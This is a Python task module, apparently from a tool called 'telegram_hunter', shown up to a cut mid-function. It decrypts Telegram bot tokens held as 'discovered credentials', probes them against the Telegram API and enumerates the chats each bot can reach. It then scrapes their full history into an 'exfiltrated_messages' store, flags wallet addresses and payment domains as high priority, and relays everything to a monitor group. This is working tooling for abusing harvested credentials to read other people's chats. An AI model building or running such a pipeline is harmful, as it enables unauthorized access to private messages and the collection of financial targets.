import asyncio
import os
import time
from collections import defaultdict
from typing import Any, Dict, List

import httpx
from app.workers.celery_app import app
from app.core.database import db
from app.core.security import security
from app.services.scraper_srv import scraper_service
import redis
from app.core.config import settings
import logging
from celery.exceptions import SoftTimeLimitExceeded
from app.core.audit import AuditEvent, AuditLogger

logger = logging.getLogger("flow.tasks")

HIGH_PRIORITY_DOMAIN_KEYWORDS = (
    "wallet",
    "pay",
    "payment",
    "checkout",
    "exchange",
    "crypto",
    "blockchain",
)

# Helper for async DB execution
async def async_execute(query_builder):
    """Executes a Supabase query builder synchronously in a background thread."""
    return await asyncio.to_thread(query_builder.execute)


async def _send_alert(message: str) -> None:
    """Best-effort control-channel notification for high-priority telemetry."""
    try:
        await get_broadcaster().send_log(message)
    except Exception as e:
        logger.debug(f"[TelemetryParser] Alert dispatch skipped: {e}")


def _is_high_priority_indicator(indicator: Dict[str, Any]) -> bool:
    indicator_type = indicator.get("indicator_type")
    indicator_value = str(indicator.get("indicator_value") or "").lower()
    if indicator_type == "wallet_address":
        return True
    if indicator_type != "network_domain":
        return False
    return any(keyword in indicator_value for keyword in HIGH_PRIORITY_DOMAIN_KEYWORDS)


async def _hydrate_message_rows_for_index(message_rows: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
    """Ensure rows have the exfiltrated_messages UUID needed by telemetry_indicators."""
    hydrated: List[Dict[str, Any]] = []
    missing_by_credential: Dict[str, List[int]] = defaultdict(list)
    source_by_key: Dict[tuple[str, int], Dict[str, Any]] = {}

    for row in message_rows:
        credential_id = row.get("credential_id")
        telegram_msg_id = row.get("telegram_msg_id")
        if row.get("id") and credential_id:
            hydrated.append(row)
            continue
        if credential_id and telegram_msg_id is not None:
            try:
                telegram_id_int = int(telegram_msg_id)
            except (TypeError, ValueError):
                continue
            key = (str(credential_id), telegram_id_int)
            source_by_key[key] = row
            missing_by_credential[str(credential_id)].append(telegram_id_int)

    for credential_id, telegram_ids in missing_by_credential.items():
        unique_ids = sorted(set(telegram_ids))
        for start in range(0, len(unique_ids), 100):
            chunk = unique_ids[start:start + 100]
            response = await async_execute(
                db.table("exfiltrated_messages")
                .select("id, credential_id, telegram_msg_id, content, media_type, file_meta")
                .eq("credential_id", credential_id)
                .in_("telegram_msg_id", chunk)
            )
            for db_row in response.data or []:
                try:
                    key = (str(db_row.get("credential_id")), int(db_row.get("telegram_msg_id")))
                except (TypeError, ValueError):
                    continue
                source_row = source_by_key.get(key, {})
                merged = dict(source_row)
                merged.update(db_row)
                hydrated.append(merged)

    return hydrated


async def _index_telemetry_indicators(message_rows: List[Dict[str, Any]]) -> int:
    """Best-effort structured indicator indexing for newly inserted messages."""
    if not message_rows:
        return 0

    try:
        from app.services.telemetry_parser import TelemetryEntityParser

        message_rows = await _hydrate_message_rows_for_index(message_rows)
        indicator_rows: List[Dict[str, Any]] = []
        for row in message_rows:
            message_id = row.get("id")
            credential_id = row.get("credential_id")
            if not message_id or not credential_id:
                continue

            raw_payload = row.get("raw_payload")
            if not isinstance(raw_payload, dict):
                raw_payload = row.get("file_meta") if isinstance(row.get("file_meta"), dict) else {}

            indicators = TelemetryEntityParser.parse_payload(row.get("content") or "", raw_payload)
            for indicator in indicators:
                indicator_rows.append({
                    "credential_id": credential_id,
                    "message_id": message_id,
                    "indicator_type": indicator["type"],
                    "indicator_value": indicator["value"],
                    "raw_context": {
                        "telegram_msg_id": row.get("telegram_msg_id"),
                        "media_type": row.get("media_type"),
                    },
                })

        if not indicator_rows:
            return 0

        result = await asyncio.wait_for(
            async_execute(
                db.table("telemetry_indicators").upsert(
                    indicator_rows,
                    on_conflict="message_id,indicator_type,indicator_value",
                    ignore_duplicates=True,
                )
            ),
            timeout=10.0,
        )
        inserted_rows = result.data or []
        high_priority_rows = [
            row for row in inserted_rows
            if _is_high_priority_indicator(row)
        ]
        if high_priority_rows:
            preview = ", ".join(
                str(row.get("indicator_value") or "")[:80]
                for row in high_priority_rows[:5]
            )
            await _send_alert(
                "**Telemetry Entity Indexed**\n"
                f"New financial or high-priority infrastructure strings: `{preview}`"
            )
        return len(inserted_rows)
    except Exception as e:
        logger.debug(f"[TelemetryParser] Indicator indexing skipped: {e}")
        return 0


async def _merge_credential_meta(cred_id: str, patch: Dict[str, Any]) -> Dict[str, Any]:
    """Merge a metadata patch without overwriting unrelated enrichment keys."""
    fresh_meta_res = await async_execute(
        db.table("discovered_credentials").select("meta").eq("id", cred_id).single()
    )
    existing_meta = {}
    if isinstance(fresh_meta_res.data, dict):
        existing_meta = fresh_meta_res.data.get("meta") or {}
    merged_meta = dict(existing_meta)
    merged_meta.update(patch)
    await async_execute(
        db.table("discovered_credentials").update({"meta": merged_meta}).eq("id", cred_id)
    )
    return merged_meta


def _strategy_attempt_to_dict(attempt: Any) -> Dict[str, Any]:
    if hasattr(attempt, "to_dict"):
        return attempt.to_dict()
    if isinstance(attempt, dict):
        return dict(attempt)
    return {
        "name": getattr(attempt, "name", "unknown"),
        "success": getattr(attempt, "success", False),
        "message_count": getattr(attempt, "message_count", 0),
        "reason": str(getattr(attempt, "reason", "")),
        "retryable": getattr(attempt, "retryable", False),
        "evidence": getattr(attempt, "evidence", {}),
    }


async def _persist_scrape_classification(cred_id: str, scrape_result: Any) -> None:
    from datetime import datetime, timezone

    if hasattr(scrape_result, "to_metadata"):
        meta_patch = scrape_result.to_metadata()
    else:
        meta_patch = {
            "last_scrape_reason": "success" if scrape_result else "no_new_messages",
            "last_scrape_retryable": False,
            "last_scrape_evidence": {"legacy_result": True},
            "last_scrape_strategy_attempts": [],
            "last_scrape_next_action": "persist_messages" if scrape_result else "no_action",
        }

    meta_patch["last_scrape_at"] = datetime.now(timezone.utc).isoformat()
    await _merge_credential_meta(cred_id, meta_patch)

    reason = meta_patch.get("last_scrape_reason")
    attempts = meta_patch.get("last_scrape_strategy_attempts") or []
    AuditLogger.log(
        AuditEvent.SCRAPE_CLASSIFIED,
        credential_id=cred_id,
        details={
            "reason": reason,
            "retryable": meta_patch.get("last_scrape_retryable"),
            "next_action": meta_patch.get("last_scrape_next_action"),
            "message_count": len(getattr(scrape_result, "messages", scrape_result or [])),
            "strategy_count": len(attempts),
        },
        success=reason in ("success", "no_new_messages"),
    )
    for attempt in attempts:
        attempt_data = _strategy_attempt_to_dict(attempt)
        AuditLogger.log(
            AuditEvent.SCRAPE_STRATEGY_ATTEMPT,
            credential_id=cred_id,
            details=attempt_data,
            success=bool(attempt_data.get("success")),
        )


def _broadcast_retry_delay_seconds(reason: str, retryable: bool, retry_after_seconds: int | None) -> int:
    if retry_after_seconds:
        return max(60, int(retry_after_seconds) + 30)
    if not retryable:
        return 24 * 3600
    if reason == "timeout":
        return 5 * 60
    if reason == "network_disconnect":
        return 10 * 60
    if reason == "topic_missing":
        return 60
    if reason == "flood_wait":
        return 30 * 60
    return 15 * 60


_BROADCAST_RELIABILITY_COLUMNS_AVAILABLE: bool | None = None
_BROADCAST_RELIABILITY_LAST_CHECK = 0.0


def _is_missing_broadcast_reliability_column(exc: BaseException) -> bool:
    text = str(exc).lower()
    return (
        any(
            column in text
            for column in ("broadcast_error", "broadcast_attempts", "next_retry_at")
        )
        and (
            "column" in text
            or "schema cache" in text
            or "does not exist" in text
            or "42703" in text
            or "pgrst204" in text
        )
    )


def _can_use_broadcast_reliability_columns() -> bool:
    if _BROADCAST_RELIABILITY_COLUMNS_AVAILABLE is not False:
        return True
    return time.time() - _BROADCAST_RELIABILITY_LAST_CHECK > 300


def _set_broadcast_reliability_columns_available(value: bool) -> None:
    global _BROADCAST_RELIABILITY_COLUMNS_AVAILABLE
    global _BROADCAST_RELIABILITY_LAST_CHECK
    _BROADCAST_RELIABILITY_COLUMNS_AVAILABLE = value
    _BROADCAST_RELIABILITY_LAST_CHECK = time.time()


async def _fetch_pending_broadcast_messages(batch_size: int, now_iso: str) -> List[Dict[str, Any]]:
    base_query = (
        db.table("exfiltrated_messages")
        .select("*, discovered_credentials!inner(meta)")
        .eq("is_broadcasted", False)
    )

    if _can_use_broadcast_reliability_columns():
        try:
            response = await async_execute(
                base_query
                .or_(f"next_retry_at.is.null,next_retry_at.lte.{now_iso}")
                .order("telegram_msg_id", desc=False)
                .limit(batch_size)
            )
            _set_broadcast_reliability_columns_available(True)
            return response.data or []
        except Exception as exc:
            if not _is_missing_broadcast_reliability_column(exc):
                raise
            _set_broadcast_reliability_columns_available(False)
            logger.warning(
                "[Broadcast] Reliability columns missing; using legacy pending query. "
                "Apply database/migrations/2026-08-02-scrape-broadcast-reliability.sql "
                "to enable retry scheduling."
            )

    response = await async_execute(
        db.table("exfiltrated_messages")
        .select("*, discovered_credentials!inner(meta)")
        .eq("is_broadcasted", False)
        .order("telegram_msg_id", desc=False)
        .limit(batch_size)
    )
    return response.data or []


async def _update_message_broadcast_success(msg_id: str) -> None:
    payload = {
        "is_broadcasted": True,
        "broadcast_claimed_at": None,
    }
    if _can_use_broadcast_reliability_columns():
        try:
            await async_execute(
                db.table("exfiltrated_messages")
                .update({
                    **payload,
                    "broadcast_error": None,
                    "next_retry_at": None,
                })
                .eq("id", msg_id)
            )
            _set_broadcast_reliability_columns_available(True)
            return
        except Exception as exc:
            if not _is_missing_broadcast_reliability_column(exc):
                raise
            _set_broadcast_reliability_columns_available(False)
            logger.warning(
                "[Broadcast] Reliability columns missing on success update; "
                "falling back to legacy broadcast status update."
            )

    await async_execute(db.table("exfiltrated_messages").update(payload).eq("id", msg_id))


async def _mark_broadcast_failure(msg: Dict[str, Any], exc: BaseException) -> None:
    from datetime import datetime, timedelta, timezone

    msg_id = msg["id"]
    reason = getattr(exc, "reason", exc.__class__.__name__)
    retryable = bool(getattr(exc, "retryable", True))
    detail = getattr(exc, "detail", str(exc)) or reason
    retry_after_seconds = getattr(exc, "retry_after_seconds", None)
    now = datetime.now(timezone.utc)
    attempts = int(msg.get("broadcast_attempts") or 0) + 1
    delay_seconds = _broadcast_retry_delay_seconds(reason, retryable, retry_after_seconds)
    next_retry_at = (now + timedelta(seconds=delay_seconds)).isoformat()
    payload = {
        "broadcast_claimed_at": None,
        "broadcast_error": {
            "reason": reason,
            "detail": str(detail)[:500],
            "retryable": retryable,
            "failed_at": now.isoformat(),
        },
        "broadcast_attempts": attempts,
        "next_retry_at": next_retry_at,
    }
    try:
        await async_execute(db.table("exfiltrated_messages").update(payload).eq("id", msg_id))
        _set_broadcast_reliability_columns_available(True)
    except Exception as update_exc:
        if not _is_missing_broadcast_reliability_column(update_exc):
            raise
        _set_broadcast_reliability_columns_available(False)
        logger.warning(
            "[Broadcast] Reliability columns missing on failure update; clearing claim only. "
            "Apply database/migrations/2026-08-02-scrape-broadcast-reliability.sql "
            "to persist broadcast errors and retry times."
        )
        await async_execute(
            db.table("exfiltrated_messages")
            .update({"broadcast_claimed_at": None})
            .eq("id", msg_id)
        )
    AuditLogger.log(
        AuditEvent.BROADCAST_FAILED,
        credential_id=msg.get("credential_id"),
        details={
            "message_id": msg_id,
            "reason": reason,
            "retryable": retryable,
            "attempts": attempts,
            "next_retry_at": next_retry_at,
        },
        success=False,
    )


# Redis Client for Locking
redis_client = redis.from_url(settings.REDIS_URL, decode_responses=True)


# ==============================================
# BROADCASTER SINGLETON (BUG-011)
# Module-level instance so bot rotation state (itertools.cycle)
# persists across task invocations within the same worker process.
# ==============================================
_broadcaster = None


def get_broadcaster():
    """
    Returns the module-level BroadcasterService singleton.
    Lazy-initialized to avoid import-time issues.
    Bot rotation state is preserved across all task calls in this worker.
    """
    global _broadcaster
    if _broadcaster is None:
        from app.services.broadcaster_srv import BroadcasterService
        _broadcaster = BroadcasterService()
    return _broadcaster

@app.task(name="flow.exfiltrate_chat", soft_time_limit=2400, time_limit=2500)
def exfiltrate_chat(cred_id: str):
    """
    1. Decrypt token.
    2. Scrape history.
    3. Save to DB.
    4. Trigger broadcast.
    """
    try:
        from app.workers.celery_app import get_worker_loop
        return get_worker_loop().run_until_complete(_exfiltrate_logic(cred_id))
    except SoftTimeLimitExceeded:
        logger.warning(f"⏰ [Exfil] Soft time limit exceeded for {cred_id}. Saving partial results.")
        return f"Exfiltration timed out for {cred_id} (partial results may have been saved)."

async def _exfiltrate_logic(cred_id: str):
    logger.info(f"🕵️ [Exfil] Starting process for CredID: {cred_id}")

    broadcaster = get_broadcaster()
    await broadcaster.send_log(f"🕵️ Starting exfiltration for CredID: `{cred_id}`")

    # T010: Observability hook
    from app.core.metrics import metrics
    from app.core.audit import AuditLogger
    metrics.inc("exfiltrate.started")
    AuditLogger.log(
        event_type="exfiltrate.start",
        credential_id=cred_id,
        details={"cred_id": cred_id}
    )
    
    # Fetch credential
    response = await async_execute(db.table("discovered_credentials").select("bot_token, chat_id, meta").eq("id", cred_id))
    if not response.data:
        logger.error(f"❌ [Exfil] Credential {cred_id} not found in DB.")
        return f"Credential {cred_id} not found."
    
    record = response.data[0]
    encrypted_token = record["bot_token"]
    chat_id = record["chat_id"]

    logger.info(f"    [Exfil] Found Chat ID: {chat_id}")

    # Guard: never exfiltrate the monitor hub — circular scrape protection.
    # Use the async resolver so the first call (cold cache) doesn't block the event loop
    # via a synchronous httpx.get() inside an async task.
    from app.services.scraper_srv import _resolve_monitor_group_ids_async
    if chat_id:
        monitor_ids = await _resolve_monitor_group_ids_async()
        if str(chat_id) in monitor_ids or chat_id in monitor_ids:
            logger.warning(f"⛔ [Exfil] Skipping cred {cred_id} — chat_id {chat_id} is the monitor hub.")
            await async_execute(
                db.table("discovered_credentials")
                .update({"chat_id": None})
                .eq("id", cred_id)
            )
            return f"Skipped: chat_id {chat_id} is monitor hub — cleared."


    try:
        if not encrypted_token.startswith("gAAAA"):
            # Likely raw token from "bugged" scanner run
            bot_token = encrypted_token
            # SELF-HEAL: Encrypt and update DB BEFORE using the token downstream
            try:
                new_enc = security.encrypt(bot_token)
                await async_execute(db.table("discovered_credentials").update({"bot_token": new_enc}).eq("id", cred_id))
                logger.info(f"    🩹 [Exfil] Self-healed unencrypted token for {cred_id}")
            except Exception as heal_err:
                logger.warning(f"    ⚠️ [Exfil] Self-heal encrypt failed for {cred_id}: {heal_err}")
        else:
            bot_token = security.decrypt(encrypted_token).strip()
    except Exception as e:
        # Invalid token or key mismatch
        logger.error(f"❌ [Exfil] Decryption failed for {cred_id}: {e}")
        await async_execute(db.table("discovered_credentials").update({"status": "revoked"}).eq("id", cred_id))
        return f"Decryption failed for {cred_id}: {e}"

    # Validate decrypted token format before use
    from app.utils.helpers import is_valid_telegram_token
    if not is_valid_telegram_token(bot_token):
        logger.error(f"❌ [Exfil] Decrypted token has invalid format for {cred_id}. Marking revoked.")
        await async_execute(db.table("discovered_credentials").update({"status": "revoked"}).eq("id", cred_id))
        return f"Invalid token format after decryption for {cred_id}"

    # HTTP Preflight Check — verify token before heavy scrape
    try:
        await scraper_service._probe_gateway_telemetry(encrypted_token, cred_id)
        updates, meta_info, is_revoked = await scraper_service._http_preflight_check(bot_token)
        if is_revoked:
            await async_execute(
                db.table("discovered_credentials").update({"status": "revoked"}).eq("id", cred_id)
            )
            return "Record inactive; marked revoked during preflight."
        if meta_info:
            await _merge_credential_meta(cred_id, meta_info)
        if updates:
            for u in updates:
                u["credential_id"] = cred_id
            preflight_result = await async_execute(
                db.table("exfiltrated_messages").upsert(
                    updates,
                    on_conflict="credential_id,telegram_msg_id",
                    ignore_duplicates=True
                )
            )
            await _index_telemetry_indicators(preflight_result.data or updates)
    except Exception as e:
        logger.warning(f"⚠️ [Exfil] Preflight check failed for {cred_id}: {e}")

    # Scrape
    try:
        logger.info(f"⏳ [Exfil] Calling scraper service for chat {chat_id}...")
        await broadcaster.send_log(f"⏳ Scraping chat `{chat_id}`...")
        
        scrape_result = await scraper_service.scrape_history(bot_token, chat_id)
        await _persist_scrape_classification(cred_id, scrape_result)
        messages = list(getattr(scrape_result, "messages", scrape_result))
        
        logger.info(f"✅ [Exfil] Scraper returned {len(messages)} messages.")
        reason = getattr(scrape_result, "reason_code", "success" if messages else "no_new_messages")
        await broadcaster.send_log(f"✅ Scraped {len(messages)} messages (`{reason}`).")
    except SoftTimeLimitExceeded:
        logger.warning(f"⏰ [Exfil] Scraping timed out for chat {chat_id}. Continuing with 0 messages.")
        from app.services._scraper.results import ScrapeReason, ScrapeResult

        await _persist_scrape_classification(
            cred_id,
            ScrapeResult(
                messages=[],
                reason=ScrapeReason.TIMEOUT,
                retryable=True,
                evidence={"exception": "SoftTimeLimitExceeded", "chat_id": chat_id},
                strategy_attempts=[],
            ),
        )
        messages = []
    except Exception as e:
        err_str = str(e)
        from app.services._scraper.results import ScrapeResultClassifier

        classified = ScrapeResultClassifier().result_from_attempts(
            [],
            [ScrapeResultClassifier().classify_exception(e, strategy="scrape_history")],
            evidence={"chat_id": chat_id},
        )
        await _persist_scrape_classification(cred_id, classified)
        # Only mark revoked for definitive Telegram rejection — NOT transient errors.
        # Transient: network failures, timeouts, flood waits, server errors.
        # Permanent: bot kicked/banned, token invalid (401), account deactivated.
        permanent_errors = (
            "AuthKeyUnregisteredError" in err_str
            or "UserDeactivatedBanError" in err_str
            or ("401" in err_str and "Unauthorized" in err_str)  # explicit parens — AND binds tighter than OR
        )
        if permanent_errors:
            logger.error(f"❌ [Exfil] Permanent scraper failure for {cred_id}: {e}. Marking revoked.")
            await async_execute(db.table("discovered_credentials").update({"status": "revoked"}).eq("id", cred_id))
        else:
            logger.warning(f"⚠️ [Exfil] Transient scraper failure for {cred_id}: {e}. Leaving status for retry.")
        return f"Scraping failed: {e}"

    # Save Messages (using UPSERT to prevent duplicates)
    new_count = 0
    index_candidates: List[Dict[str, Any]] = []
    for msg in messages:
        msg["credential_id"] = cred_id
        
        # SANITIZE: Remove keys that don't exist in the 'exfiltrated_messages' table
        # ScraperService adds 'chat_id' for context, but DB doesn't have it.
        db_payload = msg.copy()
        if "chat_id" in db_payload:
            del db_payload["chat_id"]
            
        try:
            # Use upsert: insert if not exists, ignore if duplicate
            result = await async_execute(db.table("exfiltrated_messages").upsert(
                db_payload,
                on_conflict="credential_id,telegram_msg_id",  # Conflict columns
                ignore_duplicates=True  # Don't update existing, just skip
            ))
            
            if result.data:
                new_count += 1
                index_candidates.extend(result.data)
            else:
                index_candidates.append(db_payload)
        except Exception as e:
            logger.error(f"    ❌ Insert error for msg {msg.get('telegram_msg_id')}: {e}")

    if index_candidates:
        await _index_telemetry_indicators(index_candidates)

    if new_count > 0:
        await broadcaster.send_log(f"💾 Saved {new_count} new messages to DB.")

    # Trigger Broadcast
    if new_count > 0:
        broadcast_pending.delay()

    return f"Exfiltrated {new_count} new messages."

@app.task(name="flow.enrich_credential")
def enrich_credential(cred_id: str):
    """
    1. Decrypt token.
    2. Discover chats (Enrichment).
    3. Update DB with Chat ID(s).
    4. Trigger Exfiltration.
    """
    from app.workers.celery_app import get_worker_loop
    return get_worker_loop().run_until_complete(_enrich_logic(cred_id))

async def _enrich_logic(cred_id: str):
    logger.info(f"✨ [Enrich] Starting enrichment for credential {cred_id}")

    # T010: Observability hook
    from app.core.metrics import metrics
    from app.core.audit import AuditLogger
    metrics.inc("enrich.started")
    AuditLogger.log(
        event_type="enrich.start",
        credential_id=cred_id,
        details={"cred_id": cred_id}
    )

    broadcaster = get_broadcaster()
    await broadcaster.send_log(f"✨ Starting enrichment for CredID: `{cred_id}`")
    # Fetch credential
    response = await async_execute(db.table("discovered_credentials").select("bot_token").eq("id", cred_id))
    if not response.data:
        logger.error(f"❌ [Enrich] Credential {cred_id} not found.")
        return f"Credential {cred_id} not found."
    
    record = response.data[0]
    
    # Decrypt or Handle Legacy/Raw
    try:
        if not record["bot_token"].startswith("gAAAA"):
             # Likely raw token
            bot_token = record["bot_token"]
            # SELF-HEAL: Encrypt and update DB BEFORE using the token downstream
            try:
                new_enc = security.encrypt(bot_token)
                await async_execute(db.table("discovered_credentials").update({"bot_token": new_enc}).eq("id", cred_id))
                logger.info(f"    🩹 [Enrich] Self-healed unencrypted token for {cred_id}")
            except Exception as heal_err:
                logger.warning(f"    ⚠️ [Enrich] Self-heal encrypt failed for {cred_id}: {heal_err}")
        else:
            bot_token = security.decrypt(record["bot_token"]).strip()
    except Exception as e:
        logger.error(f"❌ [Enrich] Decryption failed: {e}")
        await async_execute(db.table("discovered_credentials").update({"status": "revoked"}).eq("id", cred_id))
        return f"Decryption failed: {e}"

    # Validate decrypted token format before use
    from app.utils.helpers import is_valid_telegram_token
    if not is_valid_telegram_token(bot_token):
        logger.error(f"❌ [Enrich] Decrypted token has invalid format for {cred_id}. Marking revoked.")
        await async_execute(db.table("discovered_credentials").update({"status": "revoked"}).eq("id", cred_id))
        return f"Invalid token format after decryption for {cred_id}"

    # Discover
    bot_info = {}
    try:
        logger.info("🔎 [Enrich] Discovering chats via ScraperService...")
        bot_info, chats = await scraper_service.discover_chats(bot_token)
        logger.info(f"✅ [Enrich] Discovery returned {len(chats) if chats else 0} chats.")
        if chats:
            chat_list = ", ".join([f"{c['name']} ({c['id']})" for c in chats])
            logger.info(f"    [Enrich] Chats found: {chat_list}")
            await broadcaster.send_log(f"✅ Discovered chats: {chat_list}")
        else:
            logger.info("    [Enrich] No chats found.")
            await broadcaster.send_log("⚠️ No chats found.")
    except Exception as e:
        logger.error(f"❌ [Enrich] Discovery failed: {e}")
        return f"Discovery failed: {e}"

    # Filter out synthetic "bot_self" entries — these are placeholders, not real chats.
    # discover_chats() inserts them when the token is valid but has no recent activity;
    # using the bot's own Telegram ID as a chat_id causes failed exfiltration.
    real_chats = [c for c in chats if c.get("type") != "bot_self"]

    if not real_chats:
        # Valid token, but no open dialogs (or only bot_self placeholder).
        logger.info("    [Enrich] No real chats via API. Skipping Orphan Match (Disabled).")
        # Mark as 'active' - token works but truly no chats accessible
        await async_execute(db.table("discovered_credentials").update({"status": "active"}).eq("id", cred_id))
        return "Token valid, but no real chats found. Status updated to 'active'."

    chats = real_chats

    # Update Logic
    # 1. Update the ORIGINAL record with the first chat found.
    # 2. If more chats, create NEW records (clones).

    first_chat = chats[0]
    logger.info(f"📝 [Enrich] Updating credential with Primary Chat: {first_chat['name']} (ID: {first_chat['id']})")
    
    # Update primary
    # Pre-create Topic with NEW FORMAT: @username / botid
    from app.core.config import settings
    
    bot_username = bot_info.get("username") or ""
    bot_id = bot_info.get("id") or ""

    # Fallback: if discover_chats didn't return bot info, try a direct getMe()
    if not bot_username or not bot_id:
        try:
            async with httpx.AsyncClient(timeout=10.0) as _hc:
                gm = await _hc.get(f"https://api.telegram.org/bot{bot_token}/getMe")
                if gm.status_code == 200:
                    gm_data = gm.json().get("result", {})
                    bot_username = bot_username or gm_data.get("username", "")
                    bot_id = bot_id or gm_data.get("id", "")
        except Exception:
            pass

    bot_username = bot_username or "unknown"
    bot_id = bot_id or "0"
    topic_name = f"@{bot_username} / {bot_id}"
    
    topic_id = 0
    try:
        topic_id = await broadcaster.ensure_topic(settings.MONITOR_GROUP_ID, topic_name)
        # Header handled by ensure_topic automatically
    except Exception as e:
        logger.warning(f"    ⚠️ [Enrich] Topic creation/header warning: {e}")

    # Always re-fetch meta immediately before writing to minimise the race window
    # (another worker may have enriched or set topic_id between our earlier fetch and now)
    cur = await async_execute(db.table("discovered_credentials").select("meta").eq("id", cred_id).single())
    meta_payload = dict((cur.data or {}).get("meta") or {})
    meta_payload.update({
        "chat_name": first_chat["name"],
        "type": first_chat["type"],
        "enriched": True,
        "bot_username": bot_username,
        "bot_id": bot_id,
    })
    if topic_id:
        meta_payload["topic_id"] = topic_id

    await async_execute(db.table("discovered_credentials").update({
        "chat_id": first_chat["id"],
        "meta": meta_payload,
    }).eq("id", cred_id))
    
    # Trigger Exfiltration for Primary
    logger.info(f"🚀 [Enrich] Triggering exfiltration for {cred_id}...")
    await broadcaster.send_log("🚀 Triggering background exfiltration task.")
    exfiltrate_chat.delay(cred_id)

    msg = f"Enriched {cred_id} with chat {first_chat['id']}."

    # --- Multi-chat: create sibling credential records for every additional chat ---
    if len(chats) > 1:
        import hashlib as _hashlib
        cloned = 0
        for extra_chat in chats[1:]:
            extra_chat_id = extra_chat["id"]
            # Synthetic hash: unique per (token, chat) pair so the UNIQUE constraint holds
            extra_hash = _hashlib.sha256(
                f"{bot_token}|chat:{extra_chat_id}".encode()
            ).hexdigest()

            try:
                existing = await async_execute(
                    db.table("discovered_credentials").select("id").eq("token_hash", extra_hash)
                )
                if existing.data:
                    continue  # already exists from a previous enrich run

                sibling_data = {
                    "bot_token": security.encrypt(bot_token),
                    "token_hash": extra_hash,
                    "chat_id": extra_chat_id,
                    "chat_name": extra_chat.get("name"),
                    "chat_type": extra_chat.get("type"),
                    "bot_id": str(bot_id),
                    "bot_username": bot_username,
                    "source": "multi_chat",
                    "status": "active",
                    "meta": {
                        "bot_username": bot_username,
                        "bot_id": bot_id,
                        "topic_id": topic_id,  # share same monitor topic thread
                        "parent_credential_id": cred_id,
                        "enriched": True,
                    },
                }
                res = await async_execute(db.table("discovered_credentials").insert(sibling_data))
                if res.data:
                    sibling_id = res.data[0]["id"]
                    exfiltrate_chat.delay(sibling_id)
                    cloned += 1
                    logger.info(
                        f"    ➕ [Enrich] Created sibling credential {sibling_id} for chat {extra_chat_id}"
                    )
            except Exception as e:
                logger.error(f"    ❌ [Enrich] Failed to clone for chat {extra_chat_id}: {e}")

        if cloned:
            msg += f" (+{cloned} sibling chats queued)"
            await broadcaster.send_log(f"➕ Queued {cloned} additional chat(s) for exfiltration.")

    return msg

@app.task(name="flow.broadcast_pending")
def broadcast_pending():
    # Distributed Lock to prevent race conditions (e.g. Local Worker vs Prod Worker)
    lock_key = "telegram_hunter:lock:broadcast"
    # TTL = 120s initial; renewed every 90s while the batch runs so it never expires
    # mid-batch regardless of batch size. Replaces the old fixed-240s TTL that expired
    # on large backlogs (500 msgs × 1.5s = 750s >> 240s).
    LOCK_TTL = 120
    RENEW_EVERY = 90  # renew when < 30s remain
    lock = redis_client.lock(lock_key, timeout=LOCK_TTL, blocking=False)

    acquired = lock.acquire()
    if not acquired:
        return "Skipped: Broadcast task already running (Lock active)."

    # Check Pause State
    if redis_client.get("system:paused"):
        lock.release()
        return "System Paused"

    # Background thread renews the lock periodically while the async loop runs
    import threading
    _stop_renew = threading.Event()

    def _renew_loop():
        while not _stop_renew.wait(timeout=RENEW_EVERY):
            try:
                lock.reacquire()
            except Exception:
                break  # lock gone — stop silently

    renew_thread = threading.Thread(target=_renew_loop, daemon=True)
    renew_thread.start()

    try:
        from app.workers.celery_app import get_worker_loop
        return get_worker_loop().run_until_complete(_broadcast_logic())
    finally:
        _stop_renew.set()
        renew_thread.join(timeout=2)
        try:
            lock.release()
        except redis.exceptions.LockError:
            pass  # Lock expired or already released

async def _broadcast_logic():
    """
    Broadcast pending messages to Telegram topics.
    Uses DB-level atomic claims to prevent duplicates across ALL environments.
    """
    from datetime import datetime, timezone, timedelta

    broadcaster = get_broadcaster()

    from app.core.constants import CLAIM_TIMEOUT_MINUTES
    stale_threshold = datetime.now(timezone.utc) - timedelta(minutes=CLAIM_TIMEOUT_MINUTES)
    now_iso = datetime.now(timezone.utc).isoformat()

    # Batch size: env-configurable. Default 200 (200 × 1.5s = 300s per run,
    # fits inside CLAIM_TIMEOUT_MINUTES=15 with headroom).
    # Raise via BROADCAST_BATCH_SIZE=500 if you have enough bot credentials
    # in the rotation pool to sustain the higher send rate without flood-wait.
    BROADCAST_BATCH_SIZE = int(os.getenv("BROADCAST_BATCH_SIZE", 200))
    messages = await _fetch_pending_broadcast_messages(BROADCAST_BATCH_SIZE, now_iso)
    if not messages:
        # Only log periodically or if verbose debug needed? 
        # For now, let's log it to confirm the task is running.
        logger.info("💤 No pending broadcasts found.") 
        return "No pending broadcasts."

    group_id = settings.MONITOR_GROUP_ID
    sent_count = 0
    skipped_count = 0
    already_done_count = 0
    # Local cache to avoid DB roundtrips within this batch if multiple messages for same cred
    cached_topic_ids = {}

    for msg in messages:
        msg_id = msg["id"]
        
        try:
            # ==========================================================
            # STEP 1: ATOMIC CLAIM via DB (works across ALL environments)
            # ==========================================================
            # Single conditional UPDATE — only succeeds if message is unclaimed and not yet broadcast.
            # This eliminates the TOCTOU race between check and claim.
            claim_time = datetime.now(timezone.utc).isoformat()

            # Attempt to claim an unclaimed message
            claim_result = await async_execute(db.table("exfiltrated_messages")\
                .update({"broadcast_claimed_at": claim_time})\
                .eq("id", msg_id)\
                .eq("is_broadcasted", False)\
                .is_("broadcast_claimed_at", "null")\
                )

            if not claim_result.data:
                # Either already broadcasted, or claimed by another worker.
                # Try reclaiming if the existing claim is stale.
                stale_iso = stale_threshold.isoformat()
                reclaim_result = await async_execute(db.table("exfiltrated_messages")\
                    .update({"broadcast_claimed_at": claim_time})\
                    .eq("id", msg_id)\
                    .eq("is_broadcasted", False)\
                    .lt("broadcast_claimed_at", stale_iso)\
                    )

                if not reclaim_result.data:
                    # Could not claim — either done or freshly claimed by another worker
                    skipped_count += 1
                    continue

                logger.warning(f"    🔄 Stale claim reclaimed for {msg_id}")
            
            logger.info(f"    📌 Claimed message {msg_id}")
            
            cred_id = msg["credential_id"]
            # Extract meta from the joined discovered_credentials
            cred_info = msg.get("discovered_credentials", {})
            meta = cred_info.get("meta", {}) if cred_info else {}
            
            # 1. Resolve Topic Name (Always needed for potential recreation)
            # Priority: @username / botid -> chat_name -> Cred-ID
            bot_username = meta.get("bot_username")
            bot_id = meta.get("bot_id")

            # Resolve unknown usernames via getMe before creating/finding topics
            if (not bot_username or bot_username == "unknown") and bot_id:
                try:
                    cred_res = await async_execute(
                        db.table("discovered_credentials")
                        .select("bot_token").eq("id", cred_id).single()
                    )
                    if cred_res.data:
                        raw_token = cred_res.data.get("bot_token") if isinstance(cred_res.data, dict) else cred_res.data[0]["bot_token"]
